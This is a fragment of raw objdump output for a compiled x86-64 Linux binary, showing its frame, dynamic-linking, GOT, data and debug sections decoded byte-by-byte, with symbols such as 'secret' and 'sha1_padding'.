  407d40:	1c 00                	sbb    $0x0,%al
  407d42:	00 00                	add    %al,(%rax)
  407d44:	8c 00                	mov    %es,(%rax)
  407d46:	00 00                	add    %al,(%rax)
  407d48:	88 95 ff ff 28 00    	mov    %dl,0x28ffff(%rbp)
  407d4e:	00 00                	add    %al,(%rax)
  407d50:	00 41 0e             	add    %al,0xe(%rcx)
  407d53:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407d59:	63 0c 07             	movslq (%rdi,%rax,1),%ecx
  407d5c:	08 00                	or     %al,(%rax)
  407d5e:	00 00                	add    %al,(%rax)
  407d60:	1c 00                	sbb    $0x0,%al
  407d62:	00 00                	add    %al,(%rax)
  407d64:	ac                   	lods   %ds:(%rsi),%al
  407d65:	00 00                	add    %al,(%rax)
  407d67:	00 90 95 ff ff f0    	add    %dl,-0xf00006b(%rax)
  407d6d:	00 00                	add    %al,(%rax)
  407d6f:	00 00                	add    %al,(%rax)
  407d71:	41 0e                	rex.B (bad) 
  407d73:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407d79:	02 eb                	add    %bl,%ch
  407d7b:	0c 07                	or     $0x7,%al
  407d7d:	08 00                	or     %al,(%rax)
  407d7f:	00 24 00             	add    %ah,(%rax,%rax,1)
  407d82:	00 00                	add    %al,(%rax)
  407d84:	cc                   	int3   
  407d85:	00 00                	add    %al,(%rax)
  407d87:	00 60 96             	add    %ah,-0x6a(%rax)
  407d8a:	ff                   	(bad)  
  407d8b:	ff b4 01 00 00 00 41 	pushq  0x41000000(%rcx,%rax,1)
  407d92:	0e                   	(bad)  
  407d93:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407d99:	45 83 03 03          	rex.RB addl $0x3,(%r11)
  407d9d:	aa                   	stos   %al,%es:(%rdi)
  407d9e:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
  407da1:	08 00                	or     %al,(%rax)
  407da3:	00 00                	add    %al,(%rax)
  407da5:	00 00                	add    %al,(%rax)
  407da7:	00 24 00             	add    %ah,(%rax,%rax,1)
  407daa:	00 00                	add    %al,(%rax)
  407dac:	f4                   	hlt    
  407dad:	00 00                	add    %al,(%rax)
  407daf:	00 ec                	add    %ch,%ah
  407db1:	97                   	xchg   %eax,%edi
  407db2:	ff                   	(bad)  
  407db3:	ff 91 0b 00 00 00    	callq  *0xb(%rcx)
  407db9:	41 0e                	rex.B (bad) 
  407dbb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407dc1:	48 83 03 03          	addq   $0x3,(%rbx)
  407dc5:	84 0b                	test   %cl,(%rbx)
  407dc7:	0c 07                	or     $0x7,%al
  407dc9:	08 00                	or     %al,(%rax)
  407dcb:	00 00                	add    %al,(%rax)
  407dcd:	00 00                	add    %al,(%rax)
  407dcf:	00 1c 00             	add    %bl,(%rax,%rax,1)
  407dd2:	00 00                	add    %al,(%rax)
  407dd4:	1c 01                	sbb    $0x1,%al
  407dd6:	00 00                	add    %al,(%rax)
  407dd8:	55                   	push   %rbp
  407dd9:	a3 ff ff 5d 0a 00 00 	movabs %eax,0x410000000a5dffff
  407de0:	00 41 
  407de2:	0e                   	(bad)  
  407de3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407de9:	00 00                	add    %al,(%rax)
  407deb:	00 00                	add    %al,(%rax)
  407ded:	00 00                	add    %al,(%rax)
  407def:	00 1c 00             	add    %bl,(%rax,%rax,1)
  407df2:	00 00                	add    %al,(%rax)
  407df4:	3c 01                	cmp    $0x1,%al
  407df6:	00 00                	add    %al,(%rax)
  407df8:	92                   	xchg   %eax,%edx
  407df9:	ad                   	lods   %ds:(%rsi),%eax
  407dfa:	ff                   	(bad)  
  407dfb:	ff                   	(bad)  
  407dfc:	fb                   	sti    
  407dfd:	00 00                	add    %al,(%rax)
  407dff:	00 00                	add    %al,(%rax)
  407e01:	41 0e                	rex.B (bad) 
  407e03:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407e09:	02 f6                	add    %dh,%dh
  407e0b:	0c 07                	or     $0x7,%al
  407e0d:	08 00                	or     %al,(%rax)
  407e0f:	00 1c 00             	add    %bl,(%rax,%rax,1)
  407e12:	00 00                	add    %al,(%rax)
  407e14:	5c                   	pop    %rsp
  407e15:	01 00                	add    %eax,(%rax)
  407e17:	00 6d ae             	add    %ch,-0x52(%rbp)
  407e1a:	ff                   	(bad)  
  407e1b:	ff 5b 00             	lcallq *0x0(%rbx)
  407e1e:	00 00                	add    %al,(%rax)
  407e20:	00 41 0e             	add    %al,0xe(%rcx)
  407e23:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407e29:	02 56 0c             	add    0xc(%rsi),%dl
  407e2c:	07                   	(bad)  
  407e2d:	08 00                	or     %al,(%rax)
  407e2f:	00 1c 00             	add    %bl,(%rax,%rax,1)
  407e32:	00 00                	add    %al,(%rax)
  407e34:	7c 01                	jl     407e37 <__FUNCTION__.4904+0x286>
  407e36:	00 00                	add    %al,(%rax)
  407e38:	a8 ae                	test   $0xae,%al
  407e3a:	ff                   	(bad)  
  407e3b:	ff ab 01 00 00 00    	ljmpq  *0x1(%rbx)
  407e41:	41 0e                	rex.B (bad) 
  407e43:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407e49:	03 a6 01 0c 07 08    	add    0x8070c01(%rsi),%esp
  407e4f:	00 1c 00             	add    %bl,(%rax,%rax,1)
  407e52:	00 00                	add    %al,(%rax)
  407e54:	9c                   	pushfq 
  407e55:	01 00                	add    %eax,(%rax)
  407e57:	00 33                	add    %dh,(%rbx)
  407e59:	b0 ff                	mov    $0xff,%al
  407e5b:	ff 8d 01 00 00 00    	decl   0x1(%rbp)
  407e61:	41 0e                	rex.B (bad) 
  407e63:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407e69:	03 88 01 0c 07 08    	add    0x8070c01(%rax),%ecx
  407e6f:	00 1c 00             	add    %bl,(%rax,%rax,1)
  407e72:	00 00                	add    %al,(%rax)
  407e74:	bc 01 00 00 a0       	mov    $0xa0000001,%esp
  407e79:	b1 ff                	mov    $0xff,%cl
  407e7b:	ff 60 00             	jmpq   *0x0(%rax)
  407e7e:	00 00                	add    %al,(%rax)
  407e80:	00 41 0e             	add    %al,0xe(%rcx)
  407e83:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407e89:	02 5b 0c             	add    0xc(%rbx),%bl
  407e8c:	07                   	(bad)  
  407e8d:	08 00                	or     %al,(%rax)
  407e8f:	00 1c 00             	add    %bl,(%rax,%rax,1)
  407e92:	00 00                	add    %al,(%rax)
  407e94:	dc 01                	faddl  (%rcx)
  407e96:	00 00                	add    %al,(%rax)
  407e98:	e0 b1                	loopne 407e4b <__FUNCTION__.4904+0x29a>
  407e9a:	ff                   	(bad)  
  407e9b:	ff 76 41             	pushq  0x41(%rsi)
  407e9e:	00 00                	add    %al,(%rax)
  407ea0:	00 41 0e             	add    %al,0xe(%rcx)
  407ea3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407ea9:	03 71 41             	add    0x41(%rcx),%esi
  407eac:	0c 07                	or     $0x7,%al
  407eae:	08 00                	or     %al,(%rax)
  407eb0:	1c 00                	sbb    $0x0,%al
  407eb2:	00 00                	add    %al,(%rax)
  407eb4:	fc                   	cld    
  407eb5:	01 00                	add    %eax,(%rax)
  407eb7:	00 36                	add    %dh,(%rsi)
  407eb9:	f3 ff                	repz (bad) 
  407ebb:	ff                   	(bad)  
  407ebc:	3e 01 00             	add    %eax,%ds:(%rax)
  407ebf:	00 00                	add    %al,(%rax)
  407ec1:	41 0e                	rex.B (bad) 
  407ec3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407ec9:	03 39                	add    (%rcx),%edi
  407ecb:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
  407ece:	08 00                	or     %al,(%rax)
  407ed0:	1c 00                	sbb    $0x0,%al
  407ed2:	00 00                	add    %al,(%rax)
  407ed4:	1c 02                	sbb    $0x2,%al
  407ed6:	00 00                	add    %al,(%rax)
  407ed8:	54                   	push   %rsp
  407ed9:	f4                   	hlt    
  407eda:	ff                   	(bad)  
  407edb:	ff b1 02 00 00 00    	pushq  0x2(%rcx)
  407ee1:	41 0e                	rex.B (bad) 
  407ee3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407ee9:	03 ac 02 0c 07 08 00 	add    0x8070c(%rdx,%rax,1),%ebp
  407ef0:	1c 00                	sbb    $0x0,%al
  407ef2:	00 00                	add    %al,(%rax)
  407ef4:	3c 02                	cmp    $0x2,%al
  407ef6:	00 00                	add    %al,(%rax)
  407ef8:	e5 f6                	in     $0xf6,%eax
  407efa:	ff                   	(bad)  
  407efb:	ff 1f                	lcallq *(%rdi)
  407efd:	01 00                	add    %eax,(%rax)
  407eff:	00 00                	add    %al,(%rax)
  407f01:	41 0e                	rex.B (bad) 
  407f03:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407f09:	03 1a                	add    (%rdx),%ebx
  407f0b:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
  407f0e:	08 00                	or     %al,(%rax)
  407f10:	1c 00                	sbb    $0x0,%al
  407f12:	00 00                	add    %al,(%rax)
  407f14:	5c                   	pop    %rsp
  407f15:	02 00                	add    (%rax),%al
  407f17:	00 e4                	add    %ah,%ah
  407f19:	f7 ff                	idiv   %edi
  407f1b:	ff 20                	jmpq   *(%rax)
  407f1d:	01 00                	add    %eax,(%rax)
  407f1f:	00 00                	add    %al,(%rax)
  407f21:	41 0e                	rex.B (bad) 
  407f23:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407f29:	03 1b                	add    (%rbx),%ebx
  407f2b:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
  407f2e:	08 00                	or     %al,(%rax)
  407f30:	44 00 00             	add    %r8b,(%rax)
  407f33:	00 7c 02 00          	add    %bh,0x0(%rdx,%rax,1)
  407f37:	00 e8                	add    %ch,%al
  407f39:	f8                   	clc    
  407f3a:	ff                   	(bad)  
  407f3b:	ff 65 00             	jmpq   *0x0(%rbp)
  407f3e:	00 00                	add    %al,(%rax)
  407f40:	00 42 0e             	add    %al,0xe(%rdx)
  407f43:	10 8f 02 45 0e 18    	adc    %cl,0x180e4502(%rdi)
  407f49:	8e 03                	mov    (%rbx),%es
  407f4b:	45 0e                	rex.RB (bad) 
  407f4d:	20 8d 04 45 0e 28    	and    %cl,0x280e4504(%rbp)
  407f53:	8c 05 48 0e 30 86    	mov    %es,-0x79cff1b8(%rip)        # ffffffff86708da1 <_end+0xffffffff860ffbb1>
  407f59:	06                   	(bad)  
  407f5a:	48 0e                	rex.W (bad) 
  407f5c:	38 83 07 4d 0e 40    	cmp    %al,0x400e4d07(%rbx)
  407f62:	6c                   	insb   (%dx),%es:(%rdi)
  407f63:	0e                   	(bad)  
  407f64:	38 41 0e             	cmp    %al,0xe(%rcx)
  407f67:	30 41 0e             	xor    %al,0xe(%rcx)
  407f6a:	28 42 0e             	sub    %al,0xe(%rdx)
  407f6d:	20 42 0e             	and    %al,0xe(%rdx)
  407f70:	18 42 0e             	sbb    %al,0xe(%rdx)
  407f73:	10 42 0e             	adc    %al,0xe(%rdx)
  407f76:	08 00                	or     %al,(%rax)
  407f78:	14 00                	adc    $0x0,%al
  407f7a:	00 00                	add    %al,(%rax)
  407f7c:	c4 02 00 00          	(bad)  
  407f80:	10 f9                	adc    %bh,%cl
  407f82:	ff                   	(bad)  
  407f83:	ff 02                	incl   (%rdx)
	...

0000000000407f90 <__FRAME_END__>:
  407f90:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000608e00 <__frame_dummy_init_array_entry>:
  608e00:	30 11                	xor    %dl,(%rcx)
  608e02:	40 00 00             	add    %al,(%rax)
  608e05:	00 00                	add    %al,(%rax)
	...

Disassembly of section .fini_array:

0000000000608e08 <__do_global_dtors_aux_fini_array_entry>:
  608e08:	10 11                	adc    %dl,(%rcx)
  608e0a:	40 00 00             	add    %al,(%rax)
  608e0d:	00 00                	add    %al,(%rax)
	...

Disassembly of section .jcr:

0000000000608e10 <__JCR_END__>:
	...

Disassembly of section .dynamic:

0000000000608e18 <_DYNAMIC>:
  608e18:	01 00                	add    %eax,(%rax)
  608e1a:	00 00                	add    %al,(%rax)
  608e1c:	00 00                	add    %al,(%rax)
  608e1e:	00 00                	add    %al,(%rax)
  608e20:	01 00                	add    %eax,(%rax)
  608e22:	00 00                	add    %al,(%rax)
  608e24:	00 00                	add    %al,(%rax)
  608e26:	00 00                	add    %al,(%rax)
  608e28:	01 00                	add    %eax,(%rax)
  608e2a:	00 00                	add    %al,(%rax)
  608e2c:	00 00                	add    %al,(%rax)
  608e2e:	00 00                	add    %al,(%rax)
  608e30:	6f                   	outsl  %ds:(%rsi),(%dx)
  608e31:	00 00                	add    %al,(%rax)
  608e33:	00 00                	add    %al,(%rax)
  608e35:	00 00                	add    %al,(%rax)
  608e37:	00 0c 00             	add    %cl,(%rax,%rax,1)
  608e3a:	00 00                	add    %al,(%rax)
  608e3c:	00 00                	add    %al,(%rax)
  608e3e:	00 00                	add    %al,(%rax)
  608e40:	98                   	cwtl   
  608e41:	0d 40 00 00 00       	or     $0x40,%eax
  608e46:	00 00                	add    %al,(%rax)
  608e48:	0d 00 00 00 00       	or     $0x0,%eax
  608e4d:	00 00                	add    %al,(%rax)
  608e4f:	00 94 78 40 00 00 00 	add    %dl,0x40(%rax,%rdi,2)
  608e56:	00 00                	add    %al,(%rax)
  608e58:	19 00                	sbb    %eax,(%rax)
  608e5a:	00 00                	add    %al,(%rax)
  608e5c:	00 00                	add    %al,(%rax)
  608e5e:	00 00                	add    %al,(%rax)
  608e60:	00 8e 60 00 00 00    	add    %cl,0x60(%rsi)
  608e66:	00 00                	add    %al,(%rax)
  608e68:	1b 00                	sbb    (%rax),%eax
  608e6a:	00 00                	add    %al,(%rax)
  608e6c:	00 00                	add    %al,(%rax)
  608e6e:	00 00                	add    %al,(%rax)
  608e70:	08 00                	or     %al,(%rax)
  608e72:	00 00                	add    %al,(%rax)
  608e74:	00 00                	add    %al,(%rax)
  608e76:	00 00                	add    %al,(%rax)
  608e78:	1a 00                	sbb    (%rax),%al
  608e7a:	00 00                	add    %al,(%rax)
  608e7c:	00 00                	add    %al,(%rax)
  608e7e:	00 00                	add    %al,(%rax)
  608e80:	08 8e 60 00 00 00    	or     %cl,0x60(%rsi)
  608e86:	00 00                	add    %al,(%rax)
  608e88:	1c 00                	sbb    $0x0,%al
  608e8a:	00 00                	add    %al,(%rax)
  608e8c:	00 00                	add    %al,(%rax)
  608e8e:	00 00                	add    %al,(%rax)
  608e90:	08 00                	or     %al,(%rax)
  608e92:	00 00                	add    %al,(%rax)
  608e94:	00 00                	add    %al,(%rax)
  608e96:	00 00                	add    %al,(%rax)
  608e98:	f5                   	cmc    
  608e99:	fe                   	(bad)  
  608e9a:	ff 6f 00             	ljmpq  *0x0(%rdi)
  608e9d:	00 00                	add    %al,(%rax)
  608e9f:	00 98 02 40 00 00    	add    %bl,0x4002(%rax)
  608ea5:	00 00                	add    %al,(%rax)
  608ea7:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 608ead <_DYNAMIC+0x95>
  608ead:	00 00                	add    %al,(%rax)
  608eaf:	00 08                	add    %cl,(%rax)
  608eb1:	07                   	(bad)  
  608eb2:	40 00 00             	add    %al,(%rax)
  608eb5:	00 00                	add    %al,(%rax)
  608eb7:	00 06                	add    %al,(%rsi)
  608eb9:	00 00                	add    %al,(%rax)
  608ebb:	00 00                	add    %al,(%rax)
  608ebd:	00 00                	add    %al,(%rax)
  608ebf:	00 b8 02 40 00 00    	add    %bh,0x4002(%rax)
  608ec5:	00 00                	add    %al,(%rax)
  608ec7:	00 0a                	add    %cl,(%rdx)
  608ec9:	00 00                	add    %al,(%rax)
  608ecb:	00 00                	add    %al,(%rax)
  608ecd:	00 00                	add    %al,(%rax)
  608ecf:	00 c7                	add    %al,%bh
  608ed1:	01 00                	add    %eax,(%rax)
  608ed3:	00 00                	add    %al,(%rax)
  608ed5:	00 00                	add    %al,(%rax)
  608ed7:	00 0b                	add    %cl,(%rbx)
  608ed9:	00 00                	add    %al,(%rax)
  608edb:	00 00                	add    %al,(%rax)
  608edd:	00 00                	add    %al,(%rax)
  608edf:	00 18                	add    %bl,(%rax)
  608ee1:	00 00                	add    %al,(%rax)
  608ee3:	00 00                	add    %al,(%rax)
  608ee5:	00 00                	add    %al,(%rax)
  608ee7:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 608eed <_DYNAMIC+0xd5>
	...
  608ef5:	00 00                	add    %al,(%rax)
  608ef7:	00 03                	add    %al,(%rbx)
	...
  608f01:	90                   	nop
  608f02:	60                   	(bad)  
  608f03:	00 00                	add    %al,(%rax)
  608f05:	00 00                	add    %al,(%rax)
  608f07:	00 02                	add    %al,(%rdx)
  608f09:	00 00                	add    %al,(%rax)
  608f0b:	00 00                	add    %al,(%rax)
  608f0d:	00 00                	add    %al,(%rax)
  608f0f:	00 f0                	add    %dh,%al
  608f11:	03 00                	add    (%rax),%eax
  608f13:	00 00                	add    %al,(%rax)
  608f15:	00 00                	add    %al,(%rax)
  608f17:	00 14 00             	add    %dl,(%rax,%rax,1)
  608f1a:	00 00                	add    %al,(%rax)
  608f1c:	00 00                	add    %al,(%rax)
  608f1e:	00 00                	add    %al,(%rax)
  608f20:	07                   	(bad)  
  608f21:	00 00                	add    %al,(%rax)
  608f23:	00 00                	add    %al,(%rax)
  608f25:	00 00                	add    %al,(%rax)
  608f27:	00 17                	add    %dl,(%rdi)
  608f29:	00 00                	add    %al,(%rax)
  608f2b:	00 00                	add    %al,(%rax)
  608f2d:	00 00                	add    %al,(%rax)
  608f2f:	00 a8 09 40 00 00    	add    %ch,0x4009(%rax)
  608f35:	00 00                	add    %al,(%rax)
  608f37:	00 07                	add    %al,(%rdi)
  608f39:	00 00                	add    %al,(%rax)
  608f3b:	00 00                	add    %al,(%rax)
  608f3d:	00 00                	add    %al,(%rax)
  608f3f:	00 90 09 40 00 00    	add    %dl,0x4009(%rax)
  608f45:	00 00                	add    %al,(%rax)
  608f47:	00 08                	add    %cl,(%rax)
  608f49:	00 00                	add    %al,(%rax)
  608f4b:	00 00                	add    %al,(%rax)
  608f4d:	00 00                	add    %al,(%rax)
  608f4f:	00 18                	add    %bl,(%rax)
  608f51:	00 00                	add    %al,(%rax)
  608f53:	00 00                	add    %al,(%rax)
  608f55:	00 00                	add    %al,(%rax)
  608f57:	00 09                	add    %cl,(%rcx)
  608f59:	00 00                	add    %al,(%rax)
  608f5b:	00 00                	add    %al,(%rax)
  608f5d:	00 00                	add    %al,(%rax)
  608f5f:	00 18                	add    %bl,(%rax)
  608f61:	00 00                	add    %al,(%rax)
  608f63:	00 00                	add    %al,(%rax)
  608f65:	00 00                	add    %al,(%rax)
  608f67:	00 fe                	add    %bh,%dh
  608f69:	ff                   	(bad)  
  608f6a:	ff 6f 00             	ljmpq  *0x0(%rdi)
  608f6d:	00 00                	add    %al,(%rax)
  608f6f:	00 30                	add    %dh,(%rax)
  608f71:	09 40 00             	or     %eax,0x0(%rax)
  608f74:	00 00                	add    %al,(%rax)
  608f76:	00 00                	add    %al,(%rax)
  608f78:	ff                   	(bad)  
  608f79:	ff                   	(bad)  
  608f7a:	ff 6f 00             	ljmpq  *0x0(%rdi)
  608f7d:	00 00                	add    %al,(%rax)
  608f7f:	00 02                	add    %al,(%rdx)
  608f81:	00 00                	add    %al,(%rax)
  608f83:	00 00                	add    %al,(%rax)
  608f85:	00 00                	add    %al,(%rax)
  608f87:	00 f0                	add    %dh,%al
  608f89:	ff                   	(bad)  
  608f8a:	ff 6f 00             	ljmpq  *0x0(%rdi)
  608f8d:	00 00                	add    %al,(%rax)
  608f8f:	00 d0                	add    %dl,%al
  608f91:	08 40 00             	or     %al,0x0(%rax)
	...

Disassembly of section .got:

0000000000608ff8 <.got>:
	...

Disassembly of section .got.plt:

0000000000609000 <_GLOBAL_OFFSET_TABLE_>:
  609000:	18 8e 60 00 00 00    	sbb    %cl,0x60(%rsi)
	...
  609016:	00 00                	add    %al,(%rax)
  609018:	d6                   	(bad)  
  609019:	0d 40 00 00 00       	or     $0x40,%eax
  60901e:	00 00                	add    %al,(%rax)
  609020:	e6 0d                	out    %al,$0xd
  609022:	40 00 00             	add    %al,(%rax)
  609025:	00 00                	add    %al,(%rax)
  609027:	00 f6                	add    %dh,%dh
  609029:	0d 40 00 00 00       	or     $0x40,%eax
  60902e:	00 00                	add    %al,(%rax)
  609030:	06                   	(bad)  
  609031:	0e                   	(bad)  
  609032:	40 00 00             	add    %al,(%rax)
  609035:	00 00                	add    %al,(%rax)
  609037:	00 16                	add    %dl,(%rsi)
  609039:	0e                   	(bad)  
  60903a:	40 00 00             	add    %al,(%rax)
  60903d:	00 00                	add    %al,(%rax)
  60903f:	00 26                	add    %ah,(%rsi)
  609041:	0e                   	(bad)  
  609042:	40 00 00             	add    %al,(%rax)
  609045:	00 00                	add    %al,(%rax)
  609047:	00 36                	add    %dh,(%rsi)
  609049:	0e                   	(bad)  
  60904a:	40 00 00             	add    %al,(%rax)
  60904d:	00 00                	add    %al,(%rax)
  60904f:	00 46 0e             	add    %al,0xe(%rsi)
  609052:	40 00 00             	add    %al,(%rax)
  609055:	00 00                	add    %al,(%rax)
  609057:	00 56 0e             	add    %dl,0xe(%rsi)
  60905a:	40 00 00             	add    %al,(%rax)
  60905d:	00 00                	add    %al,(%rax)
  60905f:	00 66 0e             	add    %ah,0xe(%rsi)
  609062:	40 00 00             	add    %al,(%rax)
  609065:	00 00                	add    %al,(%rax)
  609067:	00 76 0e             	add    %dh,0xe(%rsi)
  60906a:	40 00 00             	add    %al,(%rax)
  60906d:	00 00                	add    %al,(%rax)
  60906f:	00 86 0e 40 00 00    	add    %al,0x400e(%rsi)
  609075:	00 00                	add    %al,(%rax)
  609077:	00 96 0e 40 00 00    	add    %dl,0x400e(%rsi)
  60907d:	00 00                	add    %al,(%rax)
  60907f:	00 a6 0e 40 00 00    	add    %ah,0x400e(%rsi)
  609085:	00 00                	add    %al,(%rax)
  609087:	00 b6 0e 40 00 00    	add    %dh,0x400e(%rsi)
  60908d:	00 00                	add    %al,(%rax)
  60908f:	00 c6                	add    %al,%dh
  609091:	0e                   	(bad)  
  609092:	40 00 00             	add    %al,(%rax)
  609095:	00 00                	add    %al,(%rax)
  609097:	00 d6                	add    %dl,%dh
  609099:	0e                   	(bad)  
  60909a:	40 00 00             	add    %al,(%rax)
  60909d:	00 00                	add    %al,(%rax)
  60909f:	00 e6                	add    %ah,%dh
  6090a1:	0e                   	(bad)  
  6090a2:	40 00 00             	add    %al,(%rax)
  6090a5:	00 00                	add    %al,(%rax)
  6090a7:	00 f6                	add    %dh,%dh
  6090a9:	0e                   	(bad)  
  6090aa:	40 00 00             	add    %al,(%rax)
  6090ad:	00 00                	add    %al,(%rax)
  6090af:	00 06                	add    %al,(%rsi)
  6090b1:	0f 40 00             	cmovo  (%rax),%eax
  6090b4:	00 00                	add    %al,(%rax)
  6090b6:	00 00                	add    %al,(%rax)
  6090b8:	16                   	(bad)  
  6090b9:	0f 40 00             	cmovo  (%rax),%eax
  6090bc:	00 00                	add    %al,(%rax)
  6090be:	00 00                	add    %al,(%rax)
  6090c0:	26 0f 40 00          	cmovo  %es:(%rax),%eax
  6090c4:	00 00                	add    %al,(%rax)
  6090c6:	00 00                	add    %al,(%rax)
  6090c8:	36 0f 40 00          	cmovo  %ss:(%rax),%eax
  6090cc:	00 00                	add    %al,(%rax)
  6090ce:	00 00                	add    %al,(%rax)
  6090d0:	46 0f 40 00          	rex.RX cmovo (%rax),%r8d
  6090d4:	00 00                	add    %al,(%rax)
  6090d6:	00 00                	add    %al,(%rax)
  6090d8:	56                   	push   %rsi
  6090d9:	0f 40 00             	cmovo  (%rax),%eax
  6090dc:	00 00                	add    %al,(%rax)
  6090de:	00 00                	add    %al,(%rax)
  6090e0:	66 0f 40 00          	cmovo  (%rax),%ax
  6090e4:	00 00                	add    %al,(%rax)
  6090e6:	00 00                	add    %al,(%rax)
  6090e8:	76 0f                	jbe    6090f9 <_GLOBAL_OFFSET_TABLE_+0xf9>
  6090ea:	40 00 00             	add    %al,(%rax)
  6090ed:	00 00                	add    %al,(%rax)
  6090ef:	00 86 0f 40 00 00    	add    %al,0x400f(%rsi)
  6090f5:	00 00                	add    %al,(%rax)
  6090f7:	00 96 0f 40 00 00    	add    %dl,0x400f(%rsi)
  6090fd:	00 00                	add    %al,(%rax)
  6090ff:	00 a6 0f 40 00 00    	add    %ah,0x400f(%rsi)
  609105:	00 00                	add    %al,(%rax)
  609107:	00 b6 0f 40 00 00    	add    %dh,0x400f(%rsi)
  60910d:	00 00                	add    %al,(%rax)
  60910f:	00 c6                	add    %al,%dh
  609111:	0f 40 00             	cmovo  (%rax),%eax
  609114:	00 00                	add    %al,(%rax)
  609116:	00 00                	add    %al,(%rax)
  609118:	d6                   	(bad)  
  609119:	0f 40 00             	cmovo  (%rax),%eax
  60911c:	00 00                	add    %al,(%rax)
  60911e:	00 00                	add    %al,(%rax)
  609120:	e6 0f                	out    %al,$0xf
  609122:	40 00 00             	add    %al,(%rax)
  609125:	00 00                	add    %al,(%rax)
  609127:	00 f6                	add    %dh,%dh
  609129:	0f 40 00             	cmovo  (%rax),%eax
  60912c:	00 00                	add    %al,(%rax)
  60912e:	00 00                	add    %al,(%rax)
  609130:	06                   	(bad)  
  609131:	10 40 00             	adc    %al,0x0(%rax)
  609134:	00 00                	add    %al,(%rax)
  609136:	00 00                	add    %al,(%rax)
  609138:	16                   	(bad)  
  609139:	10 40 00             	adc    %al,0x0(%rax)
  60913c:	00 00                	add    %al,(%rax)
  60913e:	00 00                	add    %al,(%rax)
  609140:	26 10 40 00          	adc    %al,%es:0x0(%rax)
  609144:	00 00                	add    %al,(%rax)
  609146:	00 00                	add    %al,(%rax)
  609148:	36 10 40 00          	adc    %al,%ss:0x0(%rax)
  60914c:	00 00                	add    %al,(%rax)
  60914e:	00 00                	add    %al,(%rax)
  609150:	46 10 40 00          	rex.RX adc %r8b,0x0(%rax)
  609154:	00 00                	add    %al,(%rax)
  609156:	00 00                	add    %al,(%rax)
  609158:	56                   	push   %rsi
  609159:	10 40 00             	adc    %al,0x0(%rax)
  60915c:	00 00                	add    %al,(%rax)
  60915e:	00 00                	add    %al,(%rax)
  609160:	66                   	data16
  609161:	10 40 00             	adc    %al,0x0(%rax)
  609164:	00 00                	add    %al,(%rax)
	...

Disassembly of section .data:

0000000000609180 <__data_start>:
	...

0000000000609188 <__dso_handle>:
	...

0000000000609190 <secret>:
  609190:	b0 78                	mov    $0x78,%al
  609192:	40 00 00             	add    %al,(%rax)
	...

00000000006091a0 <sha1_padding>:
  6091a0:	80 00 00             	addb   $0x0,(%rax)
	...

Disassembly of section .bss:

00000000006091e0 <__bss_start>:
  6091e0:	00 00                	add    %al,(%rax)
	...

00000000006091e4 <got_sigwinch>:
  6091e4:	00 00                	add    %al,(%rax)
	...

00000000006091e8 <got_sigchld>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 55 62             	sub    %dl,0x62(%rbp)
   8:	75 6e                	jne    78 <_init-0x400d20>
   a:	74 75                	je     81 <_init-0x400d17>
   c:	20 34 2e             	and    %dh,(%rsi,%rbp,1)
   f:	38 2e                	cmp    %ch,(%rsi)
  11:	34 2d                	xor    $0x2d,%al
  13:	32 75 62             	xor    0x62(%rbp),%dh
  16:	75 6e                	jne    86 <_init-0x400d12>
  18:	74 75                	je     8f <_init-0x400d09>
  1a:	31 7e 31             	xor    %edi,0x31(%rsi)
  1d:	34 2e                	xor    $0x2e,%al
  1f:	30 34 2e             	xor    %dh,(%rsi,%rbp,1)
  22:	33 29                	xor    (%rcx),%ebp
  24:	20 34 2e             	and    %dh,(%rsi,%rbp,1)
  27:	38 2e                	cmp    %ch,(%rsi)
  29:	34 00                	xor    $0x0,%al

Disassembly of section .debug_aranges:

0000000000000000 <.debug_aranges>:
   0:	2c 00                	sub    $0x0,%al
   2:	00 00                	add    %al,(%rax)
   4:	02 00                	add    (%rax),%al
   6:	00 00                	add    %al,(%rax)
   8:	00 00                	add    %al,(%rax)
   a:	08 00                	or     %al,(%rax)
   c:	00 00                	add    %al,(%rax)
   e:	00 00                	add    %al,(%rax)
  10:	5d                   	pop    %rbp
  11:	11 40 00             	adc    %eax,0x0(%rax)
  14:	00 00                	add    %al,(%rax)
  16:	00 00                	add    %al,(%rax)
  18:	2d 1a 00 00 00       	sub    $0x1a,%eax
	...
  2d:	00 00                	add    %al,(%rax)
  2f:	00 2c 00             	add    %ch,(%rax,%rax,1)
  32:	00 00                	add    %al,(%rax)
  34:	02 00                	add    (%rax),%al
  36:	4c 0c 00             	rex.WR or $0x0,%al
  39:	00 08                	add    %cl,(%rax)
  3b:	00 00                	add    %al,(%rax)
  3d:	00 00                	add    %al,(%rax)
  3f:	00 8a 2b 40 00 00    	add    %cl,0x402b(%rdx)
  45:	00 00                	add    %al,(%rax)
  47:	00 8e 04 00 00 00    	add    %cl,0x4(%rsi)
	...
  5d:	00 00                	add    %al,(%rax)
  5f:	00 2c 00             	add    %ch,(%rax,%rax,1)
  62:	00 00                	add    %al,(%rax)
  64:	02 00                	add    (%rax),%al
  66:	95                   	xchg   %eax,%ebp
  67:	0f 00 00             	sldt   (%rax)
  6a:	08 00                	or     %al,(%rax)
  6c:	00 00                	add    %al,(%rax)
